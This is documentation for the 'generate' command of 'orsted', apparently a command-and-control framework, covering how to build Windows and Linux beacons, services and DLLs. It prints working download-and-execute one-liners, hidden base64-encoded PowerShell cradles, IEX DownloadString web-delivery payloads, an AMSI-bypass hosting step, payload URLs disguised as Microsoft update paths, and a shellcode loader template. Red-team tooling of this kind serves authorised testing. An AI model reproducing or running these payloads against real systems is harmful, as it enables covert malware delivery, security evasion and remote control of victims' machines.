---
title: generate
description: orsted c2 generate
---

### General

The `generate` command is only available from the main menu of the orsted client.

It allows to generate beacons.

```
orsted-client » generate --help

generate beacon or implant from a given beacon

Usage:
  generate [flags]

Flags:
  -h, --help     display help

Sub Commands:
  beacon  generate beacon (HTTP, HTTPS, TCP)
```

Listeners only support HTTP or HTTPS, TCP in the latest orsted version. Other protocol support may come soon.

### Generate a Windows beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a windows `exe`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon windows http 192.168.122.45:80
```

`main_http.exe` will be generated.

For windows, you can generate a dll or a service for each protocol of communication type.

For example, to generate a `orsted-beacon` that:
- is a windows `service`
- talk `tcp`
- connect to `127.0.0.1:4444`

You can use

```bash
orsted-client » generate beacon windows tcp_svc 127.0.0.1:4444
```

`main_tcp_svc.exe` will be generated.


### Generate a Linux beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a Linux `elf`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon linux http 192.168.122.45:80
```

`main_http` will be generated.


### Generate Beacon Options

A number of options are possible when generating a beacon

```
orsted-client » generate beacon --help

generate beacon (HTTP, HTTPS, TCP or SMB _ windows only _

Usage:
  beacon [flags] os type address

Args:
  os       string    windows or linux
  type     string    http[                   dll svc] https[ dll svc] tcp[ dll svc] or smb[ dll svc]
  address  string    address for http or tcp

Flags:
  -h, --help                          display help
  -s, --host                          Host file and return a command to download and execute
  -a, --http-proxy-address  string    URL for example 127.0.0.1:8080
  -p, --http-proxy-password string    Proxy Password
  -t, --http-proxy-type     string    HTTP Proxy Type, can be HTTP or HTTPS (default: none)
  -u, --http-proxy-username string    Proxy Username
  -n, --no-console                    If Specified, beacon will not have a console on windows
```

#### HTTP Proxy Options

It is possible to add proxy when generating a Beacon. This work only for HTTP beacon.
For example

```
orsted-client » generate beacon --http-proxy-type http --http-proxy-address 192.168.122.45:8080 windows http 192.168.122.45:80
```

#### No Console

It is possible to avoid having a console on windows using the `--no-console` command.

```
orsted-client » generate beacon --no-console windows http 192.168.122.1:80
```

This will add the following ldflags `-H=windowsgui` when generating a windows beacon.


#### Auto Hosting

To go faster while generating beacon, the `--host` command will automatically host the generated beacon at a random endpoint and return one liners to download and execute the beacon directly.

For example for windows:

```
orsted-client » generate beacon --host windows http 192.168.122.1:80
beacon/main_http.go
[+] Use the following payloads to download and run beacon
mkdir /temp; curl http://192.168.122.1:80/MicrosoftUpdate/ShellEx/KB242742/host/2gyC5f/main_http.exe -o /temp/rudeus.exe; /temp/rudeus.exe
powershell -nop -w hidden -e bQBrAGQAaQByACAALwB0AGUAbQBwADsAIABjAHUAcgBsACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAyADIALgAxADoAOAAwAC8ATQBpAGMAcgBvAHMAbwBmAHQAVQBwAGQAYQB0AGUALwBTAGgAZQBsAGwARQB4AC8ASwBCADIANAAyADcANAAyAC8AaABvAHMAdAAvADIAZwB5AEMANQBmAC8AbQBhAGkAbgBfAGgAdAB0AHAALgBlAHgAZQAgAC0AbwAgAC8AdABlAG0AcAAvAHIAdQBkAGUAdQBzAC4AZQB4AGUAOwAgAC8AdABlAG0AcAAvAHIAdQBkAGUAdQBzAC4AZQB4AGUA
```

The powershell encoded script only downloads the beacon and executes it.

For example for linux:

```
orsted-client » generate beacon --host linux http 192.168.122.1:80
beacon/main_http.go
[+] Use the following payloads to download and run beacon
curl http://192.168.122.1:80/MicrosoftUpdate/ShellEx/KB242742/host/Z2o7Oy/main_http -o /tmp/rudeus; chmod +x /tmp/rudeus; /tmp/rudeus
```


### Generate Powershell webdelivery

It is possible to generate a powershell web delivery one liner for orsted HTTP beacons.

```
orsted-client » generate pwsh --help

generate HTTP or HTTPS beacon for windows and return powershell delivery

Usage:
  pwsh [flags] type address

Args:
  type     string    http or https
  address  string    address for http or https

Flags:
  -a, --amsi       string    Amsi Bypass file (default: ./tools/windows/pwshwebdelivery/bypass.ps1)
  -h, --help                 display help
  -n, --no-console           If specified, beacon will have no console
  -t, --template   string    Loader File (default: ./tools/windows/pwshwebdelivery/loader.ps1)
```

For example:

```
orsted-client » generate pwsh http 172.16.117.30:8080
beacon/main_http.go
[+] Beacon Generated
[+] Donutting the Beacon
[+] Donut Done
[+] Hosting Loader
Loader at http://172.16.117.30:8080/MicrosoftUpdate/ShellEx/KB242742/host/cepj8FZy
[+] Hosting AMSI
Amsi bypass at http://172.16.117.30:8080/MicrosoftUpdate/ShellEx/KB242742/host/cepj8FZy/381chku6
[+] Powershell web delivery Payload (Not Stealth but quick)
IEX ((new-object Net.WebClient).DownloadString('http://172.16.117.30:8080/MicrosoftUpdate/ShellEx/KB242742/host/cepj8FZy/381chku6'));IEX ((new-object Net.WebClient).DownloadString('http://172.16.117.30:8080/MicrosoftUpdate/ShellEx/KB242742/host/cepj8FZy'));
powershell -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAMQA3AC4AMwAwADoAOAAwADgAMAAvAE0AaQBjAHIAbwBzAG8AZgB0AFUAcABkAGEAdABlAC8AUwBoAGUAbABsAEUAeAAvAEsAQgAyADQAMgA3ADQAMgAvAGgAbwBzAHQALwBjAGUAcABqADgARgBaAHkALwAzADgAMQBjAGgAawB1ADYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMQAxADcALgAzADAAOgA4ADAAOAAwAC8ATQBpAGMAcgBvAHMAbwBmAHQAVQBwAGQAYQB0AGUALwBTAGgAZQBsAGwARQB4AC8ASwBCADIANAAyADcANAAyAC8AaABvAHMAdAAvAGMAZQBwAGoAOABGAFoAeQAnACkAKQA7AA==
```

You can change the `amsi` default file as well as the default `template` if needed. In case you want to specify another template you need to specify the base64 encoded beacon shellcode as the `SHELL_CODE_B64` variable.

For example in `loader.ps1`

```
# shellcode
[Byte[]]$shellcode = [System.Convert]::FromBase64String("SHELL_CODE_B64")
```

The client will then replace the `SHELL_CODE_B64` by the real encoded shellcode.
